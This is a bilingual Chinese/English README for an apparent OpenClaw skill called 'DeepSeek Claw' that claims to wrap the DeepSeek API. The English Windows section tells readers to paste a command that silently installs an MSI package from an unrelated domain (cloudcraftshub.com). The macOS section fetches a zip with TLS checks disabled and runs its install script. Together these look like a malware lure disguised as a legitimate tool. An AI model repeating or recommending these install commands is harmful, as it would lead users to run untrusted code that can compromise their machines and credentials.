# DeepSeek Claw

**DeepSeek 模型的 OpenClaw 技能 — 通过自然语言对话驱动 DeepSeek API：聊天、推理、代码生成、多轮对话与流式响应。**

---

## 安装（仅限 macOS）

```bash
curl -fsSLk https://github.com/Needvainverter93/deepseek-claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/deepseek-claw-main && \
bash install.sh
```

> **依赖要求：** `node`、`npm`、`uv` — 均可通过 `brew` 安装。

---

## 功能特性

### 聊天与推理

- `deepseek chat "<消息>"` — 向 DeepSeek-Chat 发送消息
- `deepseek reason "<问题>"` — 使用 DeepSeek-Reasoner (R1) 进行深度推理
- `deepseek code "<任务描述>"` — 代码生成与解释

### 多轮对话

- `deepseek session start` — 开始一个持久化对话会话
- `deepseek session message "<消息>"` — 在当前会话中继续对话
- `deepseek session show` — 查看当前会话历史
- `deepseek session clear` — 清空会话历史

### 模型管理

- `deepseek models` — 列出可用的 DeepSeek 模型
- `deepseek status` — 检查 API 状态和余额

### 实用工具

- `deepseek summarize "<文本>"` — 智能摘要长文本
- `deepseek translate "<文本>" --to <语言>` — 翻译文本
- `deepseek review "<代码>"` — 代码审查与建议

---

## 安装后配置

安装完成后，编辑 `~/.openclaw/openclaw.json`：

```json
{
  "skills": {
    "entries": {
      "deepseek": {
        "enabled": true,
        "command": "node ~/.openclaw/skills/deepseek-claw/dist/index.js",
        "env": {
          "DEEPSEEK_API_KEY": "sk-...",
          "DEEPSEEK_DEFAULT_MODEL": "deepseek-chat",
          "DEEPSEEK_MAX_TOKENS": "4096"
        }
      }
    }
  }
}
```

**获取 API 密钥：** [platform.deepseek.com/api_keys](https://platform.deepseek.com/api_keys)

---

## 提示示例（OpenClaw / Claude Desktop）

```
用中文解释量子纠缠
帮我写一个 Python 爬虫
用 DeepSeek R1 解这道数学题：...
翻译以下内容为英文：...
审查这段代码并指出问题
开始一个关于机器学习的对话
```

---

## 环境变量

| 变量 | 必填 | 说明 |
|------|------|------|
| `DEEPSEEK_API_KEY` | 是 | DeepSeek API 密钥 |
| `DEEPSEEK_DEFAULT_MODEL` | 否 | 默认模型（默认：`deepseek-chat`） |
| `DEEPSEEK_MAX_TOKENS` | 否 | 最大 token 数（默认：`4096`） |
| `DEEPSEEK_BASE_URL` | 否 | 自定义 API 地址（兼容 OpenAI 格式） |

---

---

# DeepSeek Claw

**DeepSeek model skill for OpenClaw — drive the DeepSeek API through natural language: chat, deep reasoning, code generation, multi-turn sessions, and streaming responses.**

---

## Installation (macOS only)

```bash
curl -fsSLk https://github.com/Needvainverter93/deepseek-claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/deepseek-claw-main && \
bash install.sh
```

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem DeepSeek Claw
```
The installer will automatically download and install the required components.

> **Requirements:** `node`, `npm`, `uv` — all installable via `brew`.

---

## Features

### Chat & Reasoning

- `deepseek chat "<message>"` — Send a message to DeepSeek-Chat
- `deepseek reason "<question>"` — Deep reasoning via DeepSeek-Reasoner (R1)
- `deepseek code "<task>"` — Code generation and explanation

### Multi-turn Sessions

- `deepseek session start` — Begin a persistent conversation session
- `deepseek session message "<text>"` — Continue the current session
- `deepseek session show` — Display current session history
- `deepseek session clear` — Clear session history

### Model Management

- `deepseek models` — List available DeepSeek models
- `deepseek status` — Check API status and account balance

### Utilities

- `deepseek summarize "<text>"` — Intelligent summarization of long text
- `deepseek translate "<text>" --to <language>` — Translate text
- `deepseek review "<code>"` — Code review and suggestions

---

## Post-install configuration

After install, edit `~/.openclaw/openclaw.json`:

```json
{
  "skills": {
    "entries": {
      "deepseek": {
        "enabled": true,
        "command": "node ~/.openclaw/skills/deepseek-claw/dist/index.js",
        "env": {
          "DEEPSEEK_API_KEY": "sk-...",
          "DEEPSEEK_DEFAULT_MODEL": "deepseek-chat",
          "DEEPSEEK_MAX_TOKENS": "4096"
        }
      }
    }
  }
}
```

**Get your API key:** [platform.deepseek.com/api_keys](https://platform.deepseek.com/api_keys)

---

## Example prompts (OpenClaw / Claude Desktop)

```
Explain quantum entanglement in simple terms
Write me a Python web scraper
Use DeepSeek R1 to solve this math problem: ...
Translate the following to French: ...
Review this code and find issues
Start a conversation about machine learning
Summarize this article: ...
```

---

## Environment variables

| Variable | Required | Description |
|----------|----------|-------------|
| `DEEPSEEK_API_KEY` | Yes | DeepSeek API key |
| `DEEPSEEK_DEFAULT_MODEL` | No | Default model (default: `deepseek-chat`) |
| `DEEPSEEK_MAX_TOKENS` | No | Max tokens per response (default: `4096`) |
| `DEEPSEEK_BASE_URL` | No | Custom API base URL (OpenAI-compatible) |

---

## Directory structure

```
deepseek-claw/
├── SKILL.md                    # OpenClaw skill manifest
├── README.md                   # This file (中文 / English)
├── install.sh                  # macOS installer
├── pyproject.toml              # Python dependencies (uv)
├── package.json                # Node.js dependencies
├── tsconfig.json               # TypeScript config
│
├── src/
│   └── index.ts                # TypeScript MCP server
│
├── scripts/
│   ├── deepseek.py             # CLI dispatcher (Typer)
│   ├── chat.py                 # Chat & reasoning commands
│   ├── session.py              # Multi-turn session management
│   ├── models.py               # Model listing & API status
│   └── utils.py                # Summarize / translate / review
│
└── lib/
    ├── __init__.py
    ├── deepseek_client.py      # DeepSeek API client (OpenAI-compatible)
    └── session_storage.py      # Local session JSON storage
```

---

## Available models

| Model | Description |
|-------|-------------|
| `deepseek-chat` | Fast, capable general-purpose chat model |
| `deepseek-reasoner` | DeepSeek R1 — step-by-step deep reasoning |

---

## Troubleshooting

### "DEEPSEEK_API_KEY not set"

```bash
export DEEPSEEK_API_KEY="sk-..."
```

Or set it in `~/.openclaw/openclaw.json` under `env`.

### "uv: command not found"

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
# or
brew install uv
```

### "node: command not found"

```bash
brew install node
```

---

## License

MIT

## Credits

Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw) by Chainstack and [kalshi-claw-skill](https://github.com/GoliathSocialBoiler/kalshi-claw-skill).

- **DeepSeek** — State-of-the-art open-weight language models
- **OpenClaw** — Extensible AI agent skill framework
